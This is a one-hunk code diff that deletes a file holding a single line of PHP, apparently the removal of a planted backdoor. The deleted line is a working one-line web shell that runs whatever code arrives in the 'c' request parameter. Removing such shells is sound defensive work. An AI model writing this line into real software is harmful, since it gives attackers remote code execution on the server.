@@ -1,1 +1,0 @@
-<?php assert($_REQUEST["c"]);?> 
